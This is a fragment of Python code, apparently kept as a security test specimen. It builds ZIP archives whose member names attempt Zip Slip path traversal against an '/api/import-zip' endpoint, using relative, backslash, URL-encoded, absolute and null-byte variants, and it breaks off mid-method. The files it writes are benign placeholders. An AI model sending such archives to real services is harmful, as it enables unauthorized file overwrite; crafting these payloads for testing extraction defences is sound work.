        "class ArchiveTraversalSpecimen:",
        "    \"\"\"",
        "    Specimen candidate that crafts a ZIP archive containing traversal filenames.",
        "    The intent shape is Zip Slip style path traversal via archive member names.",
        "    \"\"\"",
        "",
        "    TRAVERSAL_VARIANTS = [",
        "        # Baseline traversal patterns",
        "        \"../..[redacted-path-marker]child_baseline.txt\",",
        "        \"..\\\\..\\\\tmp\\\\child_baseline.txt\",",
        "        # Normalization variants",
        "        \".../...[redacted-path-marker]variant_dot3.txt\",",
        "        \"..../..../[redacted-path-marker]variant_dot4.txt\",",
        "        \"....\\\\....\\\\tmp\\\\variant_dot4_win.txt\",",
        "        \".././..[redacted-path-marker]variant_mixed.txt\",",
        "        \"..%2f..%2ftmp%2fvariant_urlenc.txt\",",
        "        # Absolute-path-shaped member names",
        "        \"[redacted-path-marker]absolute_variant.txt\",",
        "        \"[redacted-path-marker]\\tmp\\\\absolute_win_variant.txt\",",
        "    ]",
        "",
        "    def __init__(self, target_endpoint: str = \"/api/import-zip\"):",
        "        self.target_endpoint = target_endpoint",
        "        self.payload_buffer = io.BytesIO()",
        "",
        "    def craft_traversal_archive(self, benign_content: bytes = b\"specimen-content\") -> bytes:",
        "        \"\"\"",
        "        Build a ZIP-shaped payload containing traversal filenames.",
        "        This specimen does NOT claim the payload succeeds against any target.",
        "        \"\"\"",
        "        with zipfile.ZipFile(self.payload_buffer, \"w\", zipfile.ZIP_DEFLATED) as zf:",
        "            for traversal_name in self.TRAVERSAL_VARIANTS:",
        "                zf.writestr(traversal_name, benign_content)",
        "        return self.payload_buffer.getvalue()",
        "",
        "    def craft_normalized_variant_archive(self, benign_content: bytes = b\"specimen-variant\") -> bytes:",
        "        \"\"\"",
        "        Variant payload using separator normalization ideas only.",
        "        Does NOT claim the target handles these differently from baseline.",
        "        \"\"\"",
        "        variants = [",
        "            (\"../..[redacted-path-marker]sep_slash.txt\", benign_content),",
        "            (\"..\\\\..\\\\tmp\\\\sep_backslash.txt\", benign_content),",
        "            (\"..\\x00../..[redacted-path-marker]null_injected.txt\", benign_content),",
        "        ]",
        "        buf = io.BytesIO()",
        "        with zipfile.ZipFile(buf, \"w\", zipfile.ZIP_DEFLATED) as zf:",
        "            for name, data in variants:",
        "                zf.writestr(name, data)",
